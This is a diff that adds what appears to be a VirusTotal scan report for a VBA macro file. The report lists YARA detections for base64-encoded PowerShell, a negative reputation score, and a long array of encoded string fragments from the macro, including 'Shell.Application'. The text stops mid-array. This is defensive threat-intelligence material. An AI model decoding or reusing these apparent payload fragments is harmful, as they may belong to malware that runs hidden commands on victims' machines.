@@ -1,0 +1,1181 @@
+{
+  "data": {
+    "id": "82a2d71036dd17ab2b3489bf965a4bc496e3fbe631dbc076cb98013a8b519a8a",
+    "type": "file",
+    "links": {
+      "self": "https://www.virustotal.com/api/v3/files/82a2d71036dd17ab2b3489bf965a4bc496e3fbe631dbc076cb98013a8b519a8a"
+    },
+    "attributes": {
+      "size": 746840,
+      "crowdsourced_yara_results": [
+        {
+          "ruleset_id": "0121cb9684",
+          "ruleset_version": "0121cb9684|589bbefc22847193cac455858fa15e627d671918",
+          "ruleset_name": "Base64_Encoded_Powershell_Directives",
+          "rule_name": "Base64_Encoded_Powershell_Directives",
+          "match_date": 1794247907,
+          "description": "This signature detects base64 encoded Powershell directives.",
+          "author": "InQuest Labs",
+          "source": "https://github.com/InQuest/yara-rules-vt"
+        },
+        {
+          "ruleset_id": "0122a7f913",
+          "ruleset_version": "0122a7f913|589bbefc22847193cac455858fa15e627d671918",
+          "ruleset_name": "Windows_API_Function",
+          "rule_name": "Windows_API_Function",
+          "match_date": 1794247907,
+          "description": "This signature detects the presence of a number of Windows API functionality often seen within embedded executables. When this signature alerts on an executable, it is not an indication of malicious behavior. However, if seen firing in other file types, deeper investigation may be warranted.",
+          "author": "InQuest Labs",
+          "source": "https://github.com/InQuest/yara-rules-vt"
+        }
+      ],
+      "filecondis": {
+        "raw_md5": "da2dad40044c61efa138266698455177",
+        "dhash": "e4c486aca4c6a2c2"
+      },
+      "last_modification_date": 1794247907,
+      "last_analysis_date": 1794247379,
+      "unique_sources": 1,
+      "reputation": -11,
+      "type_tag": "vba",
+      "times_submitted": 1,
+      "magika": "TXT",
+      "last_submission_date": 1794232976,
+      "sigma_analysis_stats": {
+        "critical": 0,
+        "high": 0,
+        "medium": 5,
+        "low": 1
+      },
+      "tlsh": "T1B8F413AB98D3FA588AC857FE50888F88CD71E6C2D782E4DBDD9807033711C64D6B4676",
+      "magic": "ASCII text, with CRLF line terminators",
+      "vba_info": {
+        "strings": [
+          "jjmDd6Ql9S8ncooXgW2yMolTV6UIuu",
+          "1Bs+Wkz7bxvdB983Xz0GLKTduLT4lR4nsQ11839MPOulvaR5xPYg3mrnD77+qt3sZNKjodz5/svD8BJr",
+          "g1qltvggWf8UOwkjra7T/94PPq0sCtEfVJ",
+          "aC0RTzkuR5QkU4Jl+DzUl1b/6vyqWfcElN5nRGte0H2m+0mwxwVnW96aYiaSxOJPOBdcCLXHUZOK/N/FZ5OBMmV9ZNmLg3Vqh66KWhmZUOKjadxeMWLI+/K7VbW0ec2hqg70",
+          "jYfx+WHLCMlN7sAczefO2BPZh39EK7K3gm",
+          "ogcVPCzoqOBh/xmJA9SFNjGbpiDgrcSpcx",
+          "Gg4KsMolZivk",
+          "EdZeRoUfbd4fCGF+Bphw94YWXkaFGRx2kk98B6GvhzSTj/wTRMMK3ZdX7AezGPUCs7MGA1oP/BHwP//m",
+          "iMvVbRw9+hp2ZuwdEUWgVw+/hKPDUal2uSkxwF+KzSj+3OtgfWoVs1",
+          "fFAZZ8FL1Pw5jHhZNk0fy2Xzlb232BAi79/hdWuFKUmHBJMkaMuf3YiaU3mCVYW4Bp/ge9RNX/ln2+Wa",
+          "1wHXoMQBz4E1N0pNRCX1cu7Ka4Eb48/V+54caftCDExdoo/bmEvAexvv89V20NpNRdNvlbv6WlUkolpd",
+          "9DmEaRKcuWA+uvZwdj8l3/K1aqCqhxPZes7hAY5NpVAR46St6ze9ZQB4gTafSAzVHKw2Kgb4LoSx",
+          "tJSfnzK4erbIIlvfnPpA64niT5zvGAkiqXeLD1KxVcJtdsmA6xuaWMEcfboOK+5I+eNMcKZpqbAHxxmW",
+          "fVphL6VLEmmgSxBqD20VwKMGHmCuQxxmM5UJG/RIwPaEBkqI8ZWVWXXeMTGaQhtZy9gwNZYnND2E",
+          "Ttn5xgGElgYjYXS5v1jsmyp5ucOAHp7kgMYN0h+GVxevyCrQt2p9WHlAbgYHuPzhW5PlIvMQpVXcH+2TRw82N2oAbG8a47Qyxgk1HY4b/u+iikgFrl0KDmAjP5Vae7/pIC0e",
+          "o6C/krLAqPK9UKUSv3CvAeRT/wHkU/8B5FP/AeRT/wHkU/8B5FP/AeRT/wHkU/8B5FP/AeRT",
+          "8zec6Ih5mTM4rVSbnKj7onnC4G9xvnJ+wGF93dEZvSm24OCegfwMvwppOguBtO2XKr81so0arkQqO2+F",
+          "La0ddo6Fm7i4B/9nkks/K/ZTUEkYZv+6QGddW6W3rCf4EBmW9CBo8E9+CLTIQ5OjHzjKk/KS",
+          "JtZYOvnP7Mjh",
+          "Fz5GHAwoivPDkOSI4rMtubyMdQyAn",
+          "9pzyauTX5cjg6kTxN+wiCkc9BZBtj59GL/KO6e8Bzh4+Yy/2ATOrXDFnTiXubAT0W1JS0o6alf4k",
+          "PRMGf/JEnDLOGwFZxyRLRTK6qNpHnqOlDi/f/QDT1bNLOWXrCsdhIo7QqdqdBLg/ezdslfRT6J7d7/G52mtp0iNxAy2WK1XzyqtA1BmxES+SSSVq0aVIyqK/cfWp5PnBPKBM",
+          "v4orEBVda2pvA7TxGV0cgMXmgNZ0V8YAuI",
+          "t+/HGHPuLvCp/r/IRsH0TvyDJvqFzG3B3MUpMegd/3vaC5HlDGUyZUR5wXjB1MvRi5FBoxxP9zZVV+fULUO5SRikDt0uMCJBe1zL1tydkL+b/WtyV5OCfMMx",
+          "8jHK1AL2NI7zkEuYomEpCSv6Xa5ed2XJXk/PbePKosl498rKFt5carWR/grFLPy7WsUAp577+90y",
+          "jl63K1SFgPKogto+czisSAG+9tgreRPucBnpTjbrMW6o/AowCkg88oLn9018UCVcmyCzYPxK",
+          "lEiuo7JeH+2nHGmFE61G33Yvf/2QtTLkv1ZclzPq0fSrHIQRJJ0oYBzSPanKIoOyP0lA1KQEBre4",
+          "2f8Yzj6z4bABPRkx0e9fjWSndHJ82XH1kJXzXfI61bkPFpVMnl2wmUBoS6JeiHUS4OhBfxtL+4U1",
+          "/wHkU/8B5FP/AeRT/wHkU/8B5FP/AeRT/wHkU/8B5FP/AeRT/wHkU/8B5FP/AeRT/wHkU/8B5FP/AeRT",
+          "HP95p6zXH59mnUD+HP75p/zWnq9mXUD+HPz3hwTVWkljMpGA+uwA90",
+          "46CzN9tadaHuOCPHeWIPgvi+mOIVx",
+          "vY13Q/hL1x4WEK3vhatXBLhulWrlgMuGEenwA90ILf29hXdD+HP95pJzXHk9gHdD+EvTHhYQdfK/LrAm",
+          "zRtE22rPvkErVps4DTACpEyVczWmG",
+          "kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJ",
+          "zhT0kOkC05iY",
+          "TntSY2fkx4PHEZRfWTbNcgfnoreI4SsaoADQQNhUHN3Xd1cPrg2fNH9qUVx0dqVOhU2Fh/njVKkiLSvY",
+          "Zql0RNT8Qxphq5+B8/seRfyldl1fsB6tMNQeRfNx8kE+8B4WaqaV8RvkH0U/p5uzS56mCGXwHiMG",
+          "obP794biBmgjyDIZhQICQBAuKbNlPk2W7N",
+          "wHkU/8B5FP/AeRT/wHkU/8B5FP/AeRT/wH",
+          "CQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJ",
+          "ep9Jr45hH1iPGIU3wZAJWSyfjHHEUAlVkb2nEoLLgdhOzAKmYrBY3bI1HeCePK95hi0hPhXRggjWaTsy",
+          "9g9QYyMYABIJYV2n3lxeok6+u5fWaGwZ3qGElwlezUqfVBF/17ctto42GFkUrRNMvdjWg+yGZuto2qMG",
+          "APdCy3thWtNBbhurUgdCm3ph+twBXhurUYdCC3nhOtzBXhurU4lhMqmnnNceL2odoP4S8feFhN1yr7us",
+          "NV9SuiCbw1E4a+AOPEoYGKTIguOddMee5mV59bSvtzs05iQosN6+s1jNjaDorFfbtjCC2x26yMwhyVqJ",
+          "+0bwK4hgl4Brp7Z9Wz/iht7neZzalvTiFrl58MGup2JTauwwRSFS+2fGUwgTnmEYNQ0iS4NN0ZPh",
+          "vmjPNafP2BcYP4S9WeFhE18bnusCaWM159vZpxg/hL1p4WEHX0ue6wHr2zWnkdEW3ng2tLAnhulW",
+          "LtHz7G/2Xs7oBWcIJE/y2e1eg7j5Uwi7s+KJUt4EQl5lv8b0gBJqUoSCOe5EmsXZw0RgcS9vGS9oBc7N",
+          "JbXc/5KvAgUX/b0KcXeCZ2rO/LWzv0x9ke8MhrNc/XqxsXsYJNhfVux+bXiRW+YBiV/8PbFwQ/hHGY53RC0HJUIN3HyRT3wHhYMK5WGujlqCFnJBzERppM1P",
+          "HhQWLe2BM1p+fZt0Q/hL3J4WGTX7vC6wJpmzXnk9lHRD+EvaXhYb7eGAM1h/5YrGhgfq8APdH+3thOty",
+          "VnxHcimFtxgnWGepaEgmkDHYvAZ7EzSY65eRGnBDuMubHc1PuZshkuzpG7jkMvWmJb9ukiDKGU+K9CFkuROg7QV0wH3uMYmZyJ5XzzRHynlA3XrWssIVIXYq",
+          "l0I1rNcROICVtAUD7PXgmo2SLAhhCVjlau7206Bo2YMit159vHrNnFupuVrldcZ5+WW7cz7g3ZJB3nbd",
+          "9FgHTkfiCNjp",
+          "ei6wHPaUbowam5pfVphG6CTwRvcH0U/oPZEzA/hxvv8m4VL4ZMBG9BOENcj6rrAqUfA/4VeE7J0O",
+          "5l+PUzMvT8DK/sJEKI6PrUOk0oI/qNI2e7nAzh2CvMcpHvB0u6zmz8tYF01tScoCqJYso659+gyZ/BB2",
+          "KcaXjeOFjEqjUa2/aTPGVPoy93aQT8Vh8YiF7ggsr7hPcsPaiiulVgDEIA0K5KJuT5yGHot3A8OJmQgYufafwzeZBHyar9l80slfDglSyV0FWIweqXKRbTcy",
+          "n5ftezwjNgyrFZL0QHiY9TCIDPeSYVcojTRaqRIeAVvopDm1z7LSgMcDlCZea6pVtairSo4QGpVd91Qo",
+          "F0gmw6ih9vjrL+yhDc5UwY0Qu/ISYkRjv3lWT2UEFuwXsDPBAslia66ZrbHIUo7xB/3Eb1+B",
+          "Zweqiaogzt",
+          "Jlh5k21bM5cG",
+          "XaVXqnyRtSVG/lPeg4IBlaN5Nu6+D",
+          "Mf7ZFxnqmg/qzsHKomoSAR+lRb+yLV3VUo",
+          "sg88B7Ie9Q2Em8Yrlc/8NlBG5UFBT8Y1nU/8NlBGx05BT8YonU/8EetDtoeRYD0H0U/dd4wQ5S/dT/wHsD/hRrO/BsUzn/gm4VLBZUFe6eTyRskH0U/oU6t+PQeRbw0EsD/h",
+          "FjYgc6JhJ/IeRT//mis+8B7Ou9QKR",
+          "yJYDN67dE1Wx9lXBD+HOS9QSSok4dBVZeVBN1w7jusD/qJVV8HjMaf",
+          "DOMwHYUN4lcO",
+          "hgZtcO+rrAetYvP3hQYNcC+rrAmjPNedf2",
+          "ZKvhanrz2/WyHuVrDfHyQgansjHoZ",
+          "MK6X/bdpm+TxJLl05GmYrvEwQ0bzICzDhxx3lpW0Jzf1jBGyHEU/NZXgoSr9zsoXVCSfvcD6",
+          "z6FZOe96OLu5ikhjPkW3LCrioR2GGdiIl3zzXTHCiFaBx1QXvQc/4MTK4IcDyrH88tiUEPKmcDIM8I2K",
+          "qzZjXCCQtEPlw7IPT1wYzCiqQbZIvoOp4e1FjqJxs7ZuQPCjNkBQ1/uVSD8mMvCQARc7cntU7Ew+",
+          "i8Oj+3f75QcFZ/0RXWzK0xzi5JN9TXuMqf3wIvRMIXLpdBPAahCXnoy13CkrUsY9vi2VswCbkDRVxBvVLZxvI55h4Gs3ug8C56QXl5wT1iC745PVhYnoh+9mwptBbpI0/kir",
+          "ub+1VrtDL9TJxjzvp90Wh2KS4lf9y8JBzaoxqiniu+f6Uj8mEiG6OQI1StBP2f1RJfhkjN2g3dH2Rvza",
+          "Zy4qRzvWWQ1ORyiUn73GNtYf3MBf/",
+          "heEBWt74VrSwF4bpV0JYDOxgXsMAPlI1VgpYLKBjjscAPlJVVrZYTNhjvscAPdCS3thzNcfP2ocsP4S9ZeFhc1yrqusCad8156PaVyw/hz/eaa81x//aByw/",
+          "OOk07ZcAxGdnuR+hxQWU2VhzzJsBLor7XZk3DI1bQus5j8tUfmtPO21rzvVBcHVFBgaSMY7UFAk2XPxa",
+          "nuK8KxFRnYSIE78s6kW8RAqV4zRsM5EDsNWsrOdiZf2D3ywQBAyOOy",
+          "hzav1HrvAD5WDWckCBEokQM2j9R67wA+TwD8O4bpvmAYlf/D2WcEP4",
+          "yKqfnRp5NjUVLJri8WxPyWuAJmaFtp715vPDUghuq6J3fHPbzTRXxd",
+          "+6lcVaee7MkICSHw3lCjZvKpAc2ZGhKY9U2oKhL/DQtbhIUKtMRmGjw7twx2ZKWDsFGzev5hwYqdQpBP",
+          "zUnvlhMiGO+9wA90Nre2F81x4pYTMhj/vcAPlJ1Vq5YbJBjLvcAPdDW39pYzKXhIT9c25rrAmn3NeeX2",
+          "RNjIMTOQ1G7c",
+          "1OExG9DhUB+QXkW0KJueRvp2YQqwHqzE8B5FV1cDBT8Ysms/8JUBG+xHzHvUMsh71DoVVdCTARvAlzEb",
+          "8TTwl4iVzad9",
+          "Shell.Application",
+          "BfQuf7/zO14ABIu8+2lJ5uvKY+laHJPMvlSem0I1PkBAgiUTT6L+vffyvtAsDvVplYo6tMJNNJ5OxEUsR24hITXHHBSVDch27+9U9hd1I8LIm9ImdOtqsl/j",
+          "5FP/AeRT/wHkU/8B5FP/AeRT/wHkU",
+          "K2UC+G6VYmWA",
+          "TYPQl0BZ2yZKquT7fs47Z+DwtlIXNU",
+          "P/AeRT/wHkU/8B5FP/AeRT/wHkU/8B5FP/AeRT/AHkU/8B5FP/OTolXwHkU//R5FP4geRT+4TkU/",
+          "z7wusB67i9keGhW1zLwusCaHs05eGBQ10bwusCaes152/bp0Q/hz9d4UGdVkZYrHxiDq8APlI23phUvS3hQWdd+8LrAes7NQe+UADRz2gW3phvNceKWGxuac",
+          "/8B5FP/AeRT/wHkU/8B5FP/AeRT/wHkU/8B5FP/AeRT/wHkU/8B5FP/AeRT/wHkU/8B5FP/A",
+          "zPLlFq6UCSLMYR/YrxmRXE4IJ9cOaRAkmWTlbyV7yhShysCvhCM1GV3AX0gjmwjPecxfmO4hwR+0",
+          "/02Hs1aVoMS1qMD4LEeo/qo7CmQpyRUTh+Gm77bo1XjU3wdCpYyCIZ5aWAmcGYKScSZPVRC/",
+          "rv+YMXR/8PZqEfAeHGoPamEnDwttX7Aezs",
+          "lXwlgM9eFBG1xrnusCacM155/alxg/",
+          "gDZAD87bJjrUjXBB1jy0GzW/QnmjU",
+          "W3tg4vWxhLoMAPnYE7eFhUYavdELQcTxZpmj6tABXhurSFFs/vmnvNag+WEzwYM6DAD5StVb6WKzAYP6DAD3Qxt7UVzXn59lHaD+EvUXhYW9f6+7rAeuYvBX",
+          "3yOX5KWi783inbb5IhFPV5qS+KipvCoEtH2gQ6VBBpWdc93SZsl1HafecWtl/sYMrCw6o8jtHwYR0TfW+OjjopeZiiCSJbHUdO7j6x4jts65RQey5dtaxWWf",
+          "XmhDYwxlU+gM1urUJOouQLH7KSn9d6gHy7DDodjoxoarzq6rTmHcrdzYeNA8rRF7G89Jvf6WU/5Y3fk/yppdTkugsrpj26VfW16tE+o0BwiDs2bBJm1Hwv5H",
+          "4wNaeHfMRO95ls6VM24Y4R0vqGyhpotqdyk3vyKrw8XJi2HO+l0WIIak93SNLy6EhbVO1GovEbUxMovsP63sTMQWe1kyb/xqsfF8LszY9sxg71CMlOtPkSvF",
+          "US0yDiEkZixifBegRExxCWZc/x4BY1fLM6XksjG1BXvDuP0cJHGSbEB9WPwGtxOu3bxZSRB4uYmy7TDt",
+          "rJPYIKWn+zdy3UngY0gWIfH7lRO1syeDlBxfkPGqqvD7HmIats9yEG+MRlvUOoWl6sw9jDUd",
+          "T167rusB61i9",
+          "0fzRTeawQy9M4g6h8QNIk8jT9Qcxcm",
+          "kZc1KvHJOiAMCSN3LktZAqpYM0B9WRXghxPdl51JBB1kV/wInNmm2sKyHtcCwqEmIzJaDszJ",
+          "Xdc+9LrAc9oFt7YAzWnvlhsrmn2thBrhurU4dGi3vgOtkBrhulWWlgM+eEhW11L0usCad8155ZYrNRiLr8APdBS3tgnNcf32zdUP4S9HeFhD1470usCaLs151PYx1Q/hLxN4",
+          "t7As/pACmvDP8GGLfYiqzueR/HZ9Y9oKP4aoiyJXnNbgaUOGydpWqqyVZqO/BdObjTX89smg",
+          "wEdDpZPvAeMSd7UmEntSUpCOhspQwwQRtiq5+BO/EeRfx7WmEje1JhH/+pQVd7EsQEPxHH8PAeRbS0OlU8NyWNMHPfRT/wk1EOe9XPPXvswf+EL3kRhBkDtf",
+          "Yb9Ocx5XtqY0W5CLQp0mByCXMMcPon0/YvtVMxJ7vjWFsT+Ay0Zduz",
+          "SbZ+jCeGpZ5AmOE69BolXTsatAjUXv1vfs46ZYCGAbL+kSinWKOhDs29uhkZNDKJz0vUv9Vq",
+          "skBNdNx8F71qhdC6WiHsu5O3/xT0mR",
+          "Q/wTskz+PRTWddmvEYzczr5y1IIZeyJ3MM",
+          "+TRiV/XffNAmadtOiAKR21agNpmqtj1Zvk7WNmeiRFrdftAAWYHN6X5lNgQ2KtQSy1/gF30E",
+          "kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ",
+          "KRegkqBiWC2EDy0GbjVBpTP2ar0inTn1zgkwtubZXjooKAFjQkBrLOgusraPVep4Im5f7vhhkkkIlmoEavep8GZJpgKBt9cxw77tVkr5rhevjH0qi9TN/WSZ",
+          "gjEms6mLzPqnrKnZy7e4Xf5mfmnShw",
+          "N9rxwHh8GPgnWWsu4gIArS2xUN/qqZ3P7Ou2vzz4NCa8D4SounBIGXRCHN1e7z6eMGDsCmu0Mi1h",
+          "eez84yZj7TfQ2SOLD3wnoq+kkoZpYtNy+UxHnylsNMzlyyItynPNEX9SbXeOts418wkmGxuYeShwrLai",
+          "frTNz5kZKG5+kwP8eRTz+H1E0G8Adtjb3/sAP4RyGkCtAP3XXSrumHkU/mhotP8AeRW6aHrpr1D7A//+",
+          "21+sBiqdLa/9PpsCdqK+6klhJuWCbCm6oGsmNDvC2UEdRhd9ttQzE+77rlGpTSFMORipU4BG9S+aTXZN",
+          "1OG9vegglTYWB+Kon/0DTnzJrC4Hk3Z3qPBAV56kNvFstkSrLgbW8dVPrP3J0VRJwqPyZRnyLvK0",
+          "bcbJenjCmAHOVkz7ymhk2BQ/Da6r55wERLMevulnw5Gb3OuXDev5OxgGz7ZSecEYwrdQXMmq2l3DbYhV",
+          "fMxRXPjTU3Nl",
+          "XuO9FYsLa1BHs0d+ifP+Z2Duqb5KSdNm8zt3ZItmrpUqnSSoBqTcEuf6/PlUhQxYcmAokcKkUPwLLeAl",
+          "ofiT49CxWQ16pGrSvlEZ/ObcT15sh6VYOafeLRSJSDkADl/4LklHiROec1HvFTEkPfpKmXiB/MiG",
+          "XFX/QtEgtf1uiJBThuRikAMUq9Axy1pk++MBv80d6tLV7VY1Wp9G/Avz8nAiJAY8m8sgEvpLOEdLFSVwjJXqJJXtH6sMc6SiSKDrrmb1oKycF/IjFSw3fBQ5",
+          "2at7H6hC06nFU/ItrLq7s6WhJa+PH",
+          "kZzdtcNH6wJUyTHxrfZMWgU6h5FP/AeRT/wH0U/8B1FP/AeRT/w6D8b2dp7SERwhj9idvi2DfvgqYod34SGFPJL/osjidJJGxWSLvS1RerCUeq0nw1+CPyjm",
+          "NaC6RuHC+fizzZYWoA5dEJAycyIW6FVggOc+go8KvJ4FJWHPkxi5v76QPVmiebKcPL4KGMr81OpqTe0B",
+          "mnqtWADhurSEOkm1OHRlt74ZrWgA4bq1IHQYt6YUrXQA4bpVn5YDPXhQTNfO7rrAmnvNefX2cc8P4S9k",
+          "keyznDcdbekK",
+          "mGr68cddfYs0rOFZReaulStM+jLV7J",
+          "DIsa10y68/E0lLvnNR/Hvb6CT4aUSkeOPrsAbtkCcmP0+07Ko9xFAynHVB4QUWrTgAuISaXUDdi9pWR6",
+          "/3xOT5okmqxFENeDuUfDNymDvKbJi5BvhbACrCoV4lk8kuEuU42nfZuSBh/fI+8Hn341JXH2",
+          "DOYtySVx9aFR00WQ/qsMla/IGb3vC",
+          "lgsieFBZVdv22cgP4S9keFhEt64IzVHjlhM6GJeywA90Irf2ljMoeFBIt74RrUgH4bpVhJYDNBhzssAP",
+          "Fb8uHaR1gdk7KXCYUaEdST/lMSbHpkO/Zuys0seMno7w+GePneXgndOPtNcxijA6bfEsXb4CBsv2SKSoO+G0DBhASlm2PYd1HWAC762icU0unkCQsamgZahK",
+          "kjWvHr9puqSV1SDWwAhqYEOXQ7+dts78EppzPs60oz6E6pEAURazGYt74t6GZsCmOk3TfJCpysMxbqVytVeHD7G9GLCvbd6PtJxi5JJoA1YeSGUIrTk5V/f9riXuQH4VEzSy",
+          "eFBQt7YDL2IY56fAD3QSt7YczUH4l",
+          "ncd8RNQEz2vfR3wBwCozJOOjc4UY19vCf7MS9duGJIQQW4aCtaEygTo42T83aZAMJUqaTwyWVsJDvpVHaiiHw0vD7QTraMbqJVVRsKgxFw/gU2Bq9j7UTUsS",
+          "g2ZQtlgQlRNZ0ZJkm1V6amU4lCv+v2JHdt5OWopKmiM9pLSQA7BunmNijidqEYXgsjhGXXf4HLzdi/gbLKnDnSsfYOunT8J6GD6vrJjtXk8/9zm3HN+TNk2YGtiLm6SP1ANK",
+          "VZeVZl11bsusB7UmEL/6iFVZl4zH729tHND+FKiTiVARvIdABZeVYT13LsusB5UmELe1JhA/+ohVWfeM",
+          "Tut1C+gfb9ep9s3eIXwTXhEoV27Ud0s6rw/LOO2FABOIJT2J1kp8Dg",
+          "1dCS4ZRtJeoPZjSD4OKjhd2GvPi1j",
+          "md/8JdG+PVyJX/wH0U/8PYuwQ/hHLQ29xQ+8B7Oi9Q2Rz/wS/gnkF5FugZqU7/OHjEupkutEwXhumapm4UwdYdFP/CTARvgTq1cJuG6gfQfRT99mmEX8R5FaaCTARvsThDX9",
+          "ncwV/mx79/nN",
+          "wXVlDXHi69mamWwD5ylurS/Y/tmF6PNUxNguDIiD4muiVfljJPxyqCdGfNlv1w5zP+BLqJdNWUdotTdYPIfhaNiqW3hz7CvBzKVy+/2lzPfWA3ZObKHhmkOI",
+          "5zJWvrIfPDE0qo5kbvpqLtUnrbnsIYXMF0/10PvkTlkZygXNn4yR8GxsuEOENG3NXLlIQqIURT23t08D97HQg/71Y6uDpldgHK5mSihKZxQN4oPGkEoGfp/hGD5tIqgOwhcX",
+          "Blako",
+          "U/+B5FP7VaRT+6WkU/8A5FP9MoRT/wHkU/8A5FP9MoRT/eaiBHhDooUfAeRT/wTkU/0B5FP95sIV6Ef0",
+          "BGEWk2pfwTosSl12cWQ4ESzoP0u31jUBxqI5hFEMlkUrYf2V9PiWmmICR/uuiTJxoM9FJnhFGUp5dgep",
+          "CQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQXwz2RT/wHhi+NRBHP/AvhVt7XnW0sBLOT+",
+          "1v9JvIV9ySOZHApsfSYele6fkX1t6+PuJ/4rBwI0SXC1znV0+s9MWqCndyu7J2LlPmgFnkYj",
+          "iqs/fCoe+i/GKaVy5yGhOCADFfR/R4tnp7ghgt/x8G9S00IrLC2CQlcZLNny6eQK5iEeQOW1voJEUton1Zho7+bA9+0NPsh9y/m6F2AhWynup21MQf96VwlcF5t2/MunRKi/",
+          "nGLqX49cLcB0FfwwbwDTOfUNz96KjCKpALBth1uyd+x87qLWyOsugGOA4FLxja0NqamToWJwy9Szi2vv",
+          "m/JyoTuTTs9F0pNdlNItwv5OPNrwuxrrV8QlOZnZPwtGl6dORRXGCQO8PsSDu3zh8xx/Yn4axooO8epdJfD5KqjrFzigUlu7uKyGHv0NtrdQtTCA4L3a0GK6",
+          "nlDYGsPM83Jpu2pKhBfy0hxsmxeOam7Nd6JeHP20dU+uYoP50kRPh2bcUzF1rK9lsYhJ5RFrKzAD7Qf5",
+          "z+u3u4jPbD39s63CPGBoBM+GNENIbrVbyKJ4pDsAUnS49c7u4Vkomd6PP0/krdvUX+UJTWMWEBWu",
+          "v8kpa3h25aPlhE3iUvB7KRXCcEyQPWO98CAPoibpqH5IzPa08T5SWZhGnalqJf/JEprai8x9ksgoGqRJ86OVJeuhwoHTOcupr7/Mo0eecjpix+EUFLGJWhUa",
+          "o8ATi4F1JUYV96k4Trn0VQSJHHfX53P/FfEeSL31h8/HZhL13LGZfdlL1kRJxg528jeYFuGJ",
+          "W14S9HeFhA1z",
+          "SfjQ1deo5lO/",
+          "Q2FeDzcR7MHP",
+          "kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ",
+          "c/I0b3aouDQCWtew42iIkS4ho73cFnTkgFmeCl0jlHKc9BM5iRJLbGq2GFGxX+BxPlYOXUra7GF42VLR",
+          "TOX53ad310QpC+R/f3Qrt6wPtvDmC",
+          "iXs3SfH51TJewZcJf0Ljv3MJ+RTr4ajuC1thAS4+bOowAZn3ZSrPF/llGjP/gA/sP7gmPJjQQUd1rHlu",
+          "UDs5yzJURMqC",
+          "fZOxQ+7oCCfJcee2+1vEiB0k4J8Y8CuI3/12Z2mEZe4MiBPMID5hY2xYXPPwRhfaT25mK2RG8ER0WTKs",
+          "LTBhkK2NNKBIhl+zv4nxy3k06gDCAFgBj8706EJYAYBnJwYKFVMc5GUDpzFpgLxgpjUfaXSUjpcEZNyh",
+          "eveI/6K99nUmIcs3oCUZWakpbIAE9Yujo0XKti2dF8qguKe0nTgoUasEAnghgfWl2lhPnp6Evs0GVoXf",
+          "qkpBjajG6ejAQm31NkLE0dirv2LsA1wp0+Qv8WZmPqW7cTt2tzr9Klq60MQ2miF3ImlXO+W1yIxU8QJO",
+          "P4UU/SB5FP/AeRT+wHkU/8B5FP/AeRT/wHkU/8B5FP/AeRT/wHkU/8B5FP/AeRT8wHkU//gH/MfC",
+          "/pXEl3UvZDflygkTrzEy1IzsEwIPbt",
+          "N4qKI0S2guGhgzPdg383PKBK30yi1Y47/4Q/X07Dtmih8jEcGWariwZcbXyJAfYKO8JIaR1gfH0Aj9blyOAi/Ds0w+sXBLSFrT4Yg7NL6irXF5+T33+7HfY3",
+          "ViIDP6gq1kdwklILQIZDTbg9kLiAGTVPeyxoLWpC+DuE2vSEHOlsAp",
+          "TjZbQp0Z4/D6PhI4A9uXYgKPii67yyhHObJGh6DXQPcQLwj3Rt4/85Aqbba7eK/UQdI9AAe9PXQ1sE6jBkHBOf6mc4OtJ35LFb2i9Pqc0nYmImeFdKTvBwWC",
+          "VgmdB5y8+fS9VPVhHNEoO9+TRqnehM",
+          "Ic1/Cy8wUG4OWki5ZOt0ys3ktSTUY3Oz/8tTFyxM6IKW4Ez/mR/14kXieURwXoh9PWvu2Xw/2Zx6uv46",
+          "5h9+uOnWR5dk1ITKKazWLI0uhcLwytjn9Vq1CPMsGDg2oiq4UtsX7lKZcVUDRV9xR0feD1xerY7vilr4",
+          "zGUwKIMPA51vVOfOydrDNcc+o1EgmcI51VG9VuEgjl8REaQFx2R94u9PJM/NXRZJLuFHaETBozX0",
+          "zhLa0yctFwZWH5VcftjVSXlPZu9/+",
+          "NdEv17xVjVj9Y6U2gCVXLqONnXxXc/WZSwL0KAoeGZsFGojnw21NSW9BnEnxL7KYzWCYjxx8H7qCVQnk",
+          "lfYqjwn+oFATfy7hw+n9SRPzSCZouLmoqu",
+          "IySnjnpa1oTAAthAPETTLGxIjhPVxy3rFUVlJ3ml02HROcBrcLqUAuV62MJ93Guot9tgdi3+Sc5KsFoF",
+          "qE0UasKwomdOXnUCrH/5Ubry6u1DLIU1lqbEb99ENd3sCiZqLxasFfvuRf3U8V08Vv+cgR4yzImIYHwveiLinTCFernyUaFyrhPk+Vhf/gPlzrSkCuiaw5xH",
+          "x+sJUBG7CVCRvIeMxH+JU5G7B4znvULCO2ty4jtLQ6cVl5URdZeVFdWXlxX1l5WX/Xzuy6wP",
+          "QO4toSNwrW6w",
+          "Pt9IFPZvHTZy4Be6b1NKxX4uskLJuHhwsCdZINn1wrB9QyPIW9Tyu6NzHL4TREal7xhAY4ogNyi6",
+          "64uPZPH+v0s4Xz/wM5yoLMj3X3S/I0",
+          "WKyp4SEvXaue6wJpzzXn7lgMweHBWt74SrbgJ4bq8NF7NeeB0KdeK57rAc9pBt7YMG2QzTRNVgvYtxg/hzkvUDs/Pmn/NSf/2HcYP4c/Hmj7NQfX2CcYP4c/",
+          "ohScVINmRPVAZQ1ImP1NGsSx05H55kxW5ia5XsB1TR/QGfDeR88BR+GIaEshGVDst86CYWc082jf/Zg6y+WXyXvqE2WAYydEqRcBLIjRqC7LLLdl5NNO9fYW",
+          "Psl6skYtNBi2hz40DPd815w+3LEKL",
+          "MAPdCG3thyt7BHhulWelgMsGNekwA+dgTN",
+          "YjtqcArdAB4bq8NDJKiTB4zHjSQRtiq52BMzNNE1XQ9pHOD+HOS9QOz+ead81h8/aBzg/hL1V4WEu3thStiAHhulXdlgM5GLO0wA90Kre2H62cAeG6tSCWGy",
+          "aahUoFJZNM0nRAsrQ6bWB79m7H2/TIO9odgrwITjY0ehwEt/Q0BwQmbK6/zjDIQfHZATPUMCFTnJ",
+          "o6eZ+QImbOnq0VhK+R9hk7FAtW9RLFoj/14Q4gztVs5QhWKJ99z8N8D9cAx45GOFyqSMdUxya4PI3bDE36SqYyzt73eU0jHAdk3BG6J8sTGh42TfsmOlcRZIDAi2SgkjGBH5",
+          "bPDF4ZKjpLAeeLDfJoxKqp0QR4QUg",
